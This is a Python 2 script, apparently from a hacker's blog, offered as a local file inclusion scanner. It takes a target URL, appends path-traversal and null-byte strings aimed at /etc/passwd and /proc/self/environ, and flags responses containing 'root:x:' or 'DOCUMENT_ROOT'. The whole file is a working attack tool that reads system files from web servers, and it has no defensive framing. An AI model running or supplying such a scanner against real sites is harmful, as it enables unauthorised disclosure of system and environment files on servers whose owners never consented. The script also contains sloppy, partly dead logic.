#!/usr/bin/python
 
import urllib2
import re
from time import sleep

home = '''
==========================================================================================================|
|============================================[sohaip-hackerDZ ]===========================================|
|=====================================[http://python-root.blogspot.com  ]=================================|
|================================[https://www.facebook.com/sohaipbarika]==================================|
|=========================================================================================================|
| local file include scaner                                                                               |
|=========================================================================================================|
'''
print home


 
sohaip = raw_input ("enter TARGET >>")
 
etc_passwd = ["/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00"]

environ = ["/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00"]

print ("\n[*] GET >> passwd")
try:
   for inc in etc_passwd:
      hackerDZ = sohaip + inc
      response = urllib2.urlopen(hackerDZ).read()
      find = re.findall("root:x:",response)
      if find:
        print("[+]scaner don ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print "[+]GET LFI -> " + hackerDZ
      elif find:
        print("erorr")  

except (KeyboardInterrupt, SystemExit):
	print("work is finished")

print ("\n[*] GET >> environ")
try:
   for inc in environ:
      hackerDZ = sohaip + inc
      response = urllib2.urlopen(hackerDZ).read()
      find = re.findall("DOCUMENT_ROOT",response)
      if find:
        print("[+]scaner don ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print("[+]wite pless ->")
        sleep(1)
        print "[+] GET LFI -> " + hackerDZ
      elif find:
        print('erorr')
except (KeyboardInterrupt, SystemExit):
	print("work is finished")